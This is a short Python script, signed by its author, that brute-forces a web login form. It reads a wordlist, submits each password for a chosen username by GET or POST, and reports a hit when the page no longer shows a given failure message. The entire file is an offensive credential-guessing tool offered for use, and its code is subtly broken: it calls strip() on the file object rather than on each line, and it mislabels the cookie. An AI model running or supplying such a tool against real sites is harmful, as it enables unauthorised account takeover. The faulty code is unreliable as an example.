import requests

target_url = input("[+] Enter page URL: ")
target_username = input("[+] Enter Targets username for Brute Force: ")
password_file = input("[+] Enter the Password file: ")
login_failed_message = input("[+] Enter the login fail message: ")
cookie_value = input("[+] Enter Cookie Value (Optional): ")


def cracking(username, url):
    for password in passwords:
        password = passwords.strip()
        print(f"Testing... {password}")
        # username field's (input) name, password field's name and
        # button name: button type (one our target source code form)
        data = {
            "username": username,
            "password": password,
            "Login": "submit"
        }

        params = {
            "username": username,
            "password": password,
            "Login": "Login",
        }

        cookies = {
            "Cookie": cookie_value
        }

        # form method was get, so we used request.get (look it from the source code)
        if cookie_value != "":
            response = requests.get(url, params=params, cookies=cookies)

        # in here form method was post, so we used request.post (lookup to it from the source code)
        else:
            response = requests.post(url, data=data)

        if login_failed_message in response.content.decode():
            pass

        else:
            print(f"[+] Found the username: {username} \n [+]Found the Password: {password}")
            exit()


with open(password_file, "r") as passwords:
    cracking(target_username, target_url)
print("[-] No matching usernames and passwords found!!!")

# Coded by Erfan Samadi
